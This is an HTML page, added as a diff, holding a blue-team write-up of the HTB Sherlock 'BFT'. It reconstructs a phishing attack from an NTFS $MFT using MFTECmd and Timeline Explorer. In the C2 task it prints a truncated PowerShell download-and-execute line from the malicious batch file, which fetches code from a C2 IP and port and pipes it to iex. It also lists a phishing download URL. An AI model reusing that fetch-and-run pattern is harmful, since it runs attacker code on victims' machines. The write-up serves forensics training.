@@ -1,0 +1,301 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <title>BFT - HTB | Writeup</title>
+  <meta name="description"
+    content="BFT HTB Sherlock writeup covering NTFS MFT analysis, Zone.Identifier ADS, timeline reconstruction, IOC extraction, and C2 identification.">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap"
+    rel="stylesheet">
+
+  <link href="../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="../assets/css/main.css" rel="stylesheet">
+</head>
+
+<body>
+  <main class="main">
+    <section class="section">
+      <div class="container writeup-detail">
+        <div class="detail-box">
+          <div class="writeup-detail-header">
+            <a class="back-link top" href="../index.html#writeups">Back to Writeups</a>
+          </div>
+
+          <h1>BFT - HTB</h1>
+          <div class="tag-list">
+            <span class="tag">Blue Team</span>
+            <span class="tag">Very Easy</span>
+            <span class="tag">Windows</span>
+            <span class="tag">DFIR</span>
+            <span class="tag">Incident Response</span>
+            <span class="tag">Threat Hunting</span>
+            <span class="tag">Digital Forensics</span>
+            <span class="tag">Timeline Analysis</span>
+            <span class="tag">MFT Analysis</span>
+            <span class="tag">ADS Analysis</span>
+            <span class="tag">IOC Extraction</span>
+            <span class="tag">Malware Analysis</span>
+            <span class="tag">NTFS</span>
+          </div>
+
+          <h2>Overview</h2>
+          <p>
+            BFT is a Blue Team Sherlock focused on NTFS forensic analysis using the <code>$MFT</code>
+            (Master File Table). The goal is to reconstruct a phishing-driven attack chain by identifying the
+            initial malicious download, recovering the Host URL from Zone.Identifier metadata, locating the executed
+            payload, validating file timestamps, calculating the MFT record offset, and extracting the C2 server from
+            resident file data.
+          </p>
+
+          <h2>What is $MFT</h2>
+          <p>
+            <code>$MFT</code> is the core structure of the NTFS filesystem. It stores metadata for files and folders,
+            including file names, paths, timestamps, file size, attributes, and deletion status. Because the
+            <code>$MFT</code> is raw binary data, it must be parsed with forensic tooling before it can be reviewed
+            efficiently.
+          </p>
+
+          <h2>Tools Used</h2>
+          <ul>
+            <li><strong>MFTECmd</strong> by Eric Zimmerman, used to parse <code>$MFT</code> into CSV.</li>
+            <li><strong>Timeline Explorer</strong>, used to review and filter the parsed timeline.</li>
+          </ul>
+
+          <h2>Environment Setup</h2>
+          <p>I used <code>Get-ZimmermanTools.ps1</code> to download the Zimmerman toolset with the net9 build.</p>
+          <p>Required dependency:</p>
+          <pre><code class="language-text">.NET Desktop Runtime 9 (x64)</code></pre>
+
+          <h2>Evidence Preparation</h2>
+          <p>The Sherlock evidence was extracted from the provided archive:</p>
+          <pre><code class="language-text">BFT.zip</code></pre>
+          <p>Resulting evidence structure:</p>
+          <pre><code class="language-text">BFT\
++-- C\
+    +-- $MFT</code></pre>
+
+          <h2>Parsing the MFT</h2>
+          <p>Initial parse command:</p>
+          <pre><code class="language-powershell">&amp; "C:\Users\moree39\Documents\Get-ZimmermanTools-master\net9\MFTECmd.exe" -f 'C:\Users\moree39\Downloads\BFT\C\$MFT' --csv "C:\Users\moree39\Downloads\output" --csvf mft.csv</code></pre>
+          <figure>
+            <img src="../assets/img/BFT/01-mftecmd-mft-csv-export.png" alt="MFTECmd parsing the BFT MFT evidence into CSV">
+            <figcaption>MFTECmd parses the raw <code>$MFT</code> evidence into a CSV timeline.</figcaption>
+          </figure>
+          <p>Open Timeline Explorer:</p>
+          <pre><code class="language-powershell">TimelineExplorer.exe</code></pre>
+          <p>Load the parsed CSV:</p>
+          <pre><code class="language-text">mft.csv</code></pre>
+          <figure>
+            <img src="../assets/img/BFT/02-timeline-explorer-load-mft-csv.png" alt="Timeline Explorer loading the parsed MFT CSV">
+            <figcaption>The parsed MFT CSV is reviewed in Timeline Explorer.</figcaption>
+          </figure>
+
+          <h2>Task 1 - Initial Malicious Download</h2>
+          <p>
+            <strong>Question:</strong> Simon Stark was targeted by attackers on February 13. He downloaded a ZIP file
+            from a link received in an email. What was the name of the ZIP file he downloaded from the link?
+          </p>
+          <p><strong>Goal:</strong> Find the ZIP file downloaded on February 13.</p>
+          <p>Filter for ZIP files:</p>
+          <pre><code class="language-text">.zip</code></pre>
+          <p>Focus on the Downloads directory:</p>
+          <pre><code class="language-text">C:\Users\simon.stark\Downloads</code></pre>
+          <p>Sort by creation time:</p>
+          <pre><code class="language-text">Created0x10</code></pre>
+          <figure>
+            <img src="../assets/img/BFT/03-zip-download-filter-timeline.png" alt="Timeline Explorer showing ZIP files in Simon Stark Downloads folder">
+            <figcaption>Filtering ZIP files in the Downloads directory reveals the initial malicious download.</figcaption>
+          </figure>
+          <p>Timeline reconstruction:</p>
+          <pre><code class="language-text">16:34 -> Stage-20240213T093324Z-001.zip
+16:35 -> invoices.zip
+16:38 -> invoice.bat</code></pre>
+          <p>The first ZIP file is the original downloaded file. The later files are related to extraction or execution.</p>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">Stage-20240213T093324Z-001.zip</code></pre>
+
+          <h2>Task 2 - Host URL IOC</h2>
+          <p>
+            <strong>Question:</strong> Examine the Zone Identifier contents for the initially downloaded ZIP file.
+            This field reveals the HostUrl from where the file was downloaded, serving as a valuable Indicator of
+            Compromise (IOC) in the investigation. What is the full Host URL from where this ZIP file was downloaded?
+          </p>
+          <p>
+            <strong>Key concept:</strong> Windows stores download-origin metadata in the
+            <code>Zone.Identifier</code> alternate data stream (ADS). This can include the <code>HostUrl</code>.
+          </p>
+          <p>Zone.Identifier stores values such as:</p>
+          <pre><code class="language-text">HostUrl=...</code></pre>
+          <p>Re-run MFTECmd with resident data enabled:</p>
+          <pre><code class="language-powershell">&amp; "C:\Users\moree39\Documents\Get-ZimmermanTools-master\net9\MFTECmd.exe" -f 'C:\Users\moree39\Downloads\BFT\C\$MFT' --csv "C:\Users\moree39\Downloads\output" --csvf mft_full.csv --ir</code></pre>
+          <figure>
+            <img src="../assets/img/BFT/04-mftecmd-resident-data-export.png" alt="MFTECmd running with resident data extraction enabled">
+            <figcaption>MFTECmd is re-run with <code>--ir</code> to include resident data.</figcaption>
+          </figure>
+          <figure>
+            <img src="../assets/img/BFT/06-resident-data-fields-output.png" alt="Resident data output generated from MFT parsing">
+            <figcaption>The expanded parse includes resident data fields needed for ADS review.</figcaption>
+          </figure>
+          <figure>
+            <img src="../assets/img/BFT/07-zone-identifier-resident-data.png" alt="Timeline Explorer showing Zone Identifier metadata">
+            <figcaption>Zone.Identifier metadata is visible after parsing resident data.</figcaption>
+          </figure>
+          <p>Load the new CSV into Timeline Explorer:</p>
+          <pre><code class="language-text">mft_full.csv</code></pre>
+          <p>Filter for the initial ZIP:</p>
+          <pre><code class="language-text">Stage-20240213T093324Z-001.zip</code></pre>
+          <p>Locate the related ADS entry:</p>
+          <pre><code class="language-text">Stage-20240213T093324Z-001.zip:Zone.Identifier</code></pre>
+          <figure>
+            <img src="../assets/img/BFT/08-stage-zip-zone-identifier-filter.png" alt="Timeline Explorer filtered for Stage ZIP Zone Identifier">
+            <figcaption>Filtering for the Stage ZIP exposes the associated Zone.Identifier ADS entry.</figcaption>
+          </figure>
+          <p>Extracted Host URL:</p>
+          <pre><code class="language-text">https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser</code></pre>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser</code></pre>
+
+          <h2>Task 3 - Malicious Executable</h2>
+          <p>
+            <strong>Question:</strong> What is the full path and name of the malicious file that executed malicious
+            code and connected to a C2 server?
+          </p>
+          <p><strong>Goal:</strong> Find the file that executed malicious code.</p>
+          <p>Filter for batch scripts:</p>
+          <pre><code class="language-text">.bat</code></pre>
+          <p>Focus on the Downloads directory and the extracted phishing ZIP contents.</p>
+          <figure>
+            <img src="../assets/img/BFT/09-bat-file-downloads-filter.png" alt="Timeline Explorer filtered for BAT files in Downloads">
+            <figcaption>The suspicious <code>invoice.bat</code> file appears inside the extracted phishing content.</figcaption>
+          </figure>
+          <p>Suspicious path identified:</p>
+          <pre><code class="language-text">.\Users\simon.stark\Downloads\Stage-20240213T093324Z-001\Stage\invoice\invoices</code></pre>
+          <p>Full malicious file path:</p>
+          <pre><code class="language-text">C:\Users\simon.stark\Downloads\Stage-20240213T093324Z-001\Stage\invoice\invoices\invoice.bat</code></pre>
+          <p>
+            This file is suspicious because it was delivered through the phishing ZIP, created in the user's Downloads
+            directory, and associated with Internet-origin metadata.
+          </p>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">C:\Users\simon.stark\Downloads\Stage-20240213T093324Z-001\Stage\invoice\invoices\invoice.bat</code></pre>
+
+          <h2>Task 4 - File Creation Timestamp</h2>
+          <p>
+            <strong>Question:</strong> Analyze the <code>$Created0x30</code> timestamp for the previously identified
+            file. When was this file created on disk?
+          </p>
+          <p>
+            <strong>Key concept:</strong> The <code>$Created0x30</code> timestamp represents the original filename
+            attribute creation time and can be more reliable than the standard information timestamp in some cases.
+          </p>
+          <table>
+            <thead>
+              <tr>
+                <th>Field</th>
+                <th>Meaning</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>Created0x10</code></td>
+                <td>Standard Information timestamp, more easily modified.</td>
+              </tr>
+              <tr>
+                <td><code>Created0x30</code></td>
+                <td>Filename Attribute timestamp, useful for original creation context.</td>
+              </tr>
+            </tbody>
+          </table>
+          <figure>
+            <img src="../assets/img/BFT/10-created0x30-timestamp.png" alt="Timeline Explorer showing Created0x30 timestamp for invoice bat">
+            <figcaption>The <code>Created0x30</code> timestamp provides the file creation time used for the answer.</figcaption>
+          </figure>
+          <p>Extracted value:</p>
+          <pre><code class="language-text">2024-02-13 16:38:39.9341426</code></pre>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">2024-02-13 16:38:39</code></pre>
+
+          <h2>Task 5 - MFT Hex Offset</h2>
+          <p>
+            <strong>Question:</strong> Finding the hex offset of an MFT record is beneficial in many investigative
+            scenarios. Find the hex offset of the stager file from Question 3.
+          </p>
+          <p>Finding the hex offset of an MFT record is useful for deeper forensic validation.</p>
+          <p>Each MFT record is 1024 bytes:</p>
+          <pre><code class="language-text">Offset = EntryNumber x 1024</code></pre>
+          <figure>
+            <img src="../assets/img/BFT/11-mft-record-offset-entry.png" alt="Timeline Explorer showing MFT entry data for the stager file">
+            <figcaption>The MFT entry data is used to calculate the record hex offset.</figcaption>
+          </figure>
+          <p>Calculation:</p>
+          <pre><code class="language-text">Entry Number x 1024 = 23998464
+Hex = 0x16E3000</code></pre>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">16E3000</code></pre>
+
+          <h2>Task 6 - C2 from Resident Data</h2>
+          <p>
+            <strong>Question:</strong> Extract the C2 server from the resident file data for the malicious batch
+            script. What IP and port does the payload connect to?
+          </p>
+          <p>
+            Small files can be resident, meaning their content is stored directly inside the MFT record. The malicious
+            batch file was only 286 bytes, so its script content could be recovered from resident data.
+          </p>
+          <figure>
+            <img src="../assets/img/BFT/12-resident-file-size.png" alt="Malicious batch file size indicating resident data">
+            <figcaption>The small file size indicates the payload can be resident inside the MFT record.</figcaption>
+          </figure>
+          <p>Resident-file indicator:</p>
+          <pre><code class="language-text">File size: 286 bytes -> resident</code></pre>
+          <p>MFTECmd was executed with resident data extraction:</p>
+          <pre><code class="language-powershell">&amp; "C:\Users\moree39\Documents\Get-ZimmermanTools-master\net9\MFTECmd.exe" -f 'C:\Users\moree39\Downloads\BFT\C\$MFT' --csv "C:\Users\moree39\Downloads\output" --csvf mft_full.csv --ir</code></pre>
+          <p>Recovered script content included a PowerShell web request:</p>
+          <figure>
+            <img src="../assets/img/BFT/13-resident-data-ascii-payload.png" alt="Resident Data ASCII field showing malicious script content">
+            <figcaption>The resident data field reveals the script content embedded in the MFT record.</figcaption>
+          </figure>
+          <figure>
+            <img src="../assets/img/BFT/14-c2-command-extraction.png" alt="Extracted PowerShell command containing C2 address">
+            <figcaption>The recovered PowerShell command exposes the C2 address and port.</figcaption>
+          </figure>
+          <pre><code class="language-powershell">powershell ... iwr('http://43.204.110.203:6666/...') | iex</code></pre>
+          <p>Extracted C2:</p>
+          <pre><code class="language-text">43.204.110.203:6666</code></pre>
+          <p><strong>Answer:</strong></p>
+          <pre><code class="language-text">43.204.110.203:6666</code></pre>
+
+          <h2>Final Attack Chain</h2>
+          <ol>
+            <li>User downloads a phishing ZIP file.</li>
+            <li>The ZIP is extracted into the user's Downloads directory.</li>
+            <li>A malicious batch file is created on disk.</li>
+            <li>The script executes PowerShell.</li>
+            <li>PowerShell connects to the C2 server.</li>
+          </ol>
+
+          <h2>Key Takeaways</h2>
+          <ul>
+            <li><code>$MFT</code> is extremely useful for reconstructing filesystem timelines.</li>
+            <li><code>Zone.Identifier</code> ADS entries can expose valuable download-origin IOCs.</li>
+            <li>Resident files may contain the full malicious payload directly inside the MFT.</li>
+            <li>Timeline analysis helps connect download, extraction, execution, and C2 activity.</li>
+          </ul>
+
+          <a class="back-link bottom" href="../index.html#writeups">Back to Writeups</a>
+        </div>
+      </div>
+    </section>
+  </main>
+  <script src="../assets/js/main.js" defer></script>
+</body>
+
+</html>
+
